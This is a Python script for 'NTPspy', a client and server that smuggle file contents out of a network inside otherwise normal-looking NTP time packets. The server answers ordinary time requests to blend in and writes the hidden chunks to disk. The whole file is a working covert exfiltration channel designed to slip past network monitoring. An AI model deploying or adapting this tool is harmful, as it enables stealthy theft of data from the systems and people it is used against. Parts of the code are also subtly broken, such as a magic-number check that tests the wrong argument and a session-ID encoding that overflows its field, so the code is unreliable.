import socket
import struct
import argparse
import time
import os
import sys

DEFAULT_NTP_PORT = 123
DEFAULT_MAGIC_NUMBER = 0xDEADBEEF
NTPSPY_VERSION = 0x01
UNIX_TO_NTP = 2208988800

# NTP packet format (48 bytes)
# length (bits), NTP field name, NTPspy special purpose/values
# 2, LI, 0x3 = fatal error
# 3, VN, 0x3 = NTPv3
# 3, Mode, 0x4 = server mode, 0x3 = client mode
# 8, Stratum, 0xF = server mode, 0x10 = client mode
# 8, Polling interval = NTPspy opcode, 0x0 query NTPspy version, 0x1 transfer file
# 8, Precision, NTPspy protocol version
# 16, Root Delay, NTPspy magic number
# 16, Root Dispersion, (reserved)
# 32, Reference ID, transfer session ID
# 32, Reference Timestamp, [0:31] seconds, [32:63] payload sequence number
# 32, Originate Timestamp, [0:31] seconds, [32:63] hidden payload data
# 32, Receive Timestamp, normal NTP timestamp
# 32, Transmit Timestamp, normal NTP timestamp

class NTPpacket:
    def __init__(self, data=False):
        self.LI = 0
        self.VN = 3
        self.mode = 0
        self.stratum = 0
        self.poll = 0
        self.precision = 0
        self.rootdelay = 0
        self.rootdispersion = 0
        self.refid = 0
        self.reftime_sec = 0
        self.reftime_frac = 0
        self.origtime_sec = 0
        self.origtime_frac = 0
        self.recvtime_sec = 0
        self.recvtime_frac = 0
        self.transtime_sec = 0
        self.transtime_frac = 0
        if data:
            self.unpack(data)

    def unpack(self, data):
        unpacked = struct.unpack("!B B B B 11I", data)
        self.LI = (unpacked[0] >> 6) & 0x3
        self.VN = (unpacked[0] >> 3) & 0x7
        self.mode = unpacked[0] & 0x7
        self.stratum = unpacked[1]
        self.poll = unpacked[2]
        self.precision = unpacked[3]
        self.rootdelay = unpacked[4]
        self.rootdispersion = unpacked[5]
        self.refid = unpacked[6]
        self.reftime_sec = unpacked[7]
        self.reftime_frac = unpacked[8]
        self.origtime_sec = unpacked[9]
        self.origtime_frac = unpacked[10]
        self.recvtime_sec = unpacked[11]
        self.recvtime_frac = unpacked[12]
        self.transtime_sec = unpacked[13]
        self.transtime_frac = unpacked[14]

    def pack(self):
        return struct.pack(
            "!B B B B 11I",
            (self.LI << 6) | (self.VN << 3) | self.mode,
            self.stratum,
            self.poll,
            self.precision,
            self.rootdelay,
            self.rootdispersion,
            self.refid,
            self.reftime_sec,
            self.reftime_frac,
            self.origtime_sec,
            self.origtime_frac,
            self.recvtime_sec,
            self.recvtime_frac,
            self.transtime_sec,
            self.transtime_frac
        )

class NTPspyMessage:
    def __init__(self, session_id=0, sequence_number=0, payload=0, opcode=0):
        self.session_id = session_id
        self.sequence_number = sequence_number
        self.payload = payload
        self.opcode = opcode
        self.version = NTPSPY_VERSION
        self.status = 0

    def from_ntp(self, ntp_packet):
        self.session_id = ntp_packet.refid
        self.sequence_number = ntp_packet.reftime_frac
        self.payload = ntp_packet.transtime_frac
        self.opcode = ntp_packet.poll
        self.version = ntp_packet.precision
        self.status = ntp_packet.LI

    def to_ntp(self):
        packet = NTPpacket()
        packet.LI = self.status
        packet.refid = self.session_id
        packet.reftime_frac = self.sequence_number
        packet.transtime_frac = self.payload
        packet.poll = self.opcode
        packet.precision = self.version
        return packet

class NTPServer:
    def __init__(self, args):
        self.port = args.p
        self.storage_path = args.path_or_ip if os.path.isdir(args.path_or_ip) else os.getcwd()
        self.magic_number = args.m
        self.verbose = args.v

    def start(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("", self.port))
        if self.verbose:
            print(f"NTPspy version {NTPSPY_VERSION} listening on port {self.port}, storing files in {self.storage_path}")
        
        try:
            while True:
                data, addr = sock.recvfrom(48)
                
                request_magic_number = struct.unpack("!I", data[4:8])[0]
                is_ntpspy = request_magic_number == self.magic_number
                request_type = "NTPspy" if is_ntpspy else "Standard"
                
                if self.verbose:
                    print(f"{addr[0]}:Received request, type: {request_type}")
                
                if is_ntpspy:
                    response = self.handle_ntpspy(data)
                else:
                    response = self.handle_normal_ntp(data)
                
                sock.sendto(response, addr)
        except KeyboardInterrupt:
            print("Server shutting down...")
        finally:
            sock.close()

    def handle_normal_ntp(self, data):
        li_vn_mode, stratum, poll, precision, root_delay, root_dispersion, reference_id, \
        ref_timestamp_sec, ref_timestamp_frac, orig_timestamp_sec, orig_timestamp_frac, \
        recv_timestamp_sec, recv_timestamp_frac, trans_timestamp_sec, trans_timestamp_frac = struct.unpack("!B B B B I I I I I I I I I I I", data)
        li = (li_vn_mode >> 6) & 0x3
        vn = (li_vn_mode >> 3) & 0x7
        mode = li_vn_mode & 0x7

        recv_timestamp = int(time.time()) + UNIX_TO_NTP 
        fractional = 0
        
        response = struct.pack(
            "!B B B B 11I",
            0x1C,  # LI=0, Version=3, Mode=4 (server)
            15, 0, 0,  # Stratum 15, Poll, Precision
            0, 0,  # Root Delay, Root Dispersion
            0,  # Reference ID
            ref_timestamp_sec, ref_timestamp_frac,  # Reference Timestamp
            orig_timestamp_sec, orig_timestamp_frac,  # Originate Timestamp
            recv_timestamp, fractional,  # Receive Timestamp
            recv_timestamp, fractional   # Transmit Timestamp
        )
        
        if self.verbose:
            print(f"Sent response, type: Ordinary NTP, timestamp: {recv_timestamp}")
        
        return response

    def handle_ntpspy(self, data):
        # extract ntp fields
        li_vn_mode, stratum, poll, precision, root_delay, root_dispersion, reference_id, \
        ref_timestamp_sec, ref_timestamp_frac, orig_timestamp_sec, orig_timestamp_frac, \
        recv_timestamp_sec, recv_timestamp_frac, trans_timestamp_sec, trans_timestamp_frac = struct.unpack("!B B B B I I I I I I I I I I I", data)
        li = (li_vn_mode >> 6) & 0x3
        vn = (li_vn_mode >> 3) & 0x7
        mode = li_vn_mode & 0x7

        opcode = poll
        session_id = reference_id
        sequence_number = ref_timestamp_frac
        payload = orig_timestamp_frac
        function = "query" if opcode == 0x0 else "transfer file"
        
        if self.verbose:
            print(f"Received request, type: NTPspy, function: {function}")
        
        if opcode == 0x1:
            filename = os.path.join(self.storage_path, f"{session_id}.dat")
            with open(filename, "ab") as f:
                f.write(payload.to_bytes(4, byteorder='big'))
            if self.verbose:
                print(f"Appended payload to file {filename}")

        # regular NTP response with current time
        recv_timestamp = time.time()
        ntp_timestamp = int(recv_timestamp) + UNIX_TO_NTP
        fractional = 0 # reserved 
        root_delay = self.magic_number
        precision = NTPSPY_VERSION
        
        response = struct.pack(
            "!B B B B 11I",
            0x1C,  # LI=0, Version=3, Mode=4 (server)
            15, opcode, precision,  # Stratum 15 = server mode, poll = opcode, precision = protocol version
            root_delay, 0,  # root Delay, root dispersion
            session_id,  # reference ID field
            ref_timestamp_sec, ref_timestamp_frac,  # Reference Timestamp
            orig_timestamp_sec, orig_timestamp_frac,  # Originate Timestamp
            ntp_timestamp, fractional,  # Receive Timestamp
            ntp_timestamp, fractional   # Transmit Timestamp
        )
        
        if self.verbose:
            print(f"Sent response, function: {function}, value: {precision}")
        
        return response

class NTPClient:
    def __init__(self, server_ip, port, filename, magic_number, verbose, session_id):
        self.server_ip = server_ip
        self.port = port
        self.filename = filename
        self.magic_number = 0
        self.verbose = verbose
        self.session_id = session_id

    def query_server(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        ntp_timestamp = int(time.time()) + UNIX_TO_NTP
        fractional = 0  # reserved
        
        request = struct.pack(
            "!B B B B 11I",
            0x1B,  # LI=0, Version=3, Mode=3 (client)
            16, 0, NTPSPY_VERSION,  # Stratum 16, Poll, Precision
            self.magic_number, 0,  # Root Delay, Root Dispersion (using magic number)
            0,  # Reference ID
            ntp_timestamp, fractional,  # Reference Timestamp
            ntp_timestamp, fractional,  # Originate Timestamp
            ntp_timestamp, fractional,  # Receive Timestamp
            ntp_timestamp, fractional   # Transmit Timestamp
        )
        
        sock.sendto(request, (self.server_ip, self.port))
        if self.verbose:
            print(f"Sent NTPspy query to {self.server_ip}:{self.port}")
        
        response, _ = sock.recvfrom(48)
        if self.verbose:
            print("Received NTP response")
        
        # unpack response
        _, _, _, precision, *_ = struct.unpack("!B B B B 11I", response)
        
        if precision == NTPSPY_VERSION:
            print(f"NTPspy server detected with protocol version {precision}")
        else:
            print("Not NTPspy server or protocol version mismatch")
        
        return precision == NTPSPY_VERSION

    def upload(self):
        if not self.query_server():
            return
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        with open(self.filename, "rb") as f:
            sequence_number = 0
            while True:
                segment = f.read(4)
                if not segment:
                    break
                
                # session ID to integer
                session_id_int = int.from_bytes(self.session_id.encode(), 'big')
                
                # segment to integer
                payload = int.from_bytes(segment, 'big')
                
                ntp_timestamp = int(time.time()) + 2208988800  # Convert UNIX to NTP epoch
                fractional = 0  # Placeholder for now
                
                request = struct.pack(
                    "!B B B B 11I",
                    0x1B,  # LI=0, Version=3, Mode=3 (client)
                    16, 0x1, NTPSPY_VERSION,  # Stratum 16, Poll = opcode, Precision = protocol version
                    self.magic_number, 0,  # Root Delay = magic number, Root Dispersion = reserved
                    session_id_int,  # Reference ID
                    ntp_timestamp, sequence_number,  # Reference Timestamp
                    ntp_timestamp, payload,  # Originate Timestamp
                    ntp_timestamp, fractional,  # Receive Timestamp
                    ntp_timestamp, fractional   # Transmit Timestamp
                )
                
                sock.sendto(request, (self.server_ip, self.port))
                if self.verbose:
                    print(f"Sent NTPspy packet to {self.server_ip}:{self.port}, sequence_number: {sequence_number}, payload: {payload}")
                
                response, _ = sock.recvfrom(48)
                if self.verbose:
                    print("Received NTP response")
                
                sequence_number += 1

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="NTPspy - NTP based file transfer utility")
    parser.add_argument("-s", action="store_true", help="Run as server")
    parser.add_argument("-p", type=int, default=DEFAULT_NTP_PORT, help="Port number")
    parser.add_argument("-m", type=int, default=DEFAULT_MAGIC_NUMBER, help="Magic number")
    parser.add_argument("-v", action="store_true", help="Verbose mode")
    parser.add_argument("path_or_ip", help="Storage path (server) or server IP (client)")
    parser.add_argument("filename", nargs="?", help="Filename to transfer (client)")
    parser.add_argument("-q", action="store_true", help="Query server for NTPspy protocol version")
    parser.add_argument("-d", type=str, help="Transfer session ID (8 digit hex)")

    args = parser.parse_args()

    if args.s:
        # server mode
        server = NTPServer(args)
        server.start()
    else:
        # client mode
        if not args.filename:
            parser.error("client mode requires a filename")
            sys.exit(1)
        if args.d:
            if not (len(args.d) <= 8 and all(c in '0123456789abcdefABCDEF' for c in args.d) and int(args.d, 16) != 0):
                parser.error("Session ID must be hex 1 - FFFFFFFF")
                sys.exit(1)
        if args.m:
            if not (len(args.d) <= 8 and all(c in '0123456789abcdefABCDEF' for c in args.d)):
                parser.error("Magic number must be hex 0 - FFFFFFFF")
                sys.exit(1)
        client = NTPClient(args.path_or_ip, args.p, args.filename, args.m, args.v, args.d or "")
        if args.q:
            client.query_server()
        else:
            client.upload()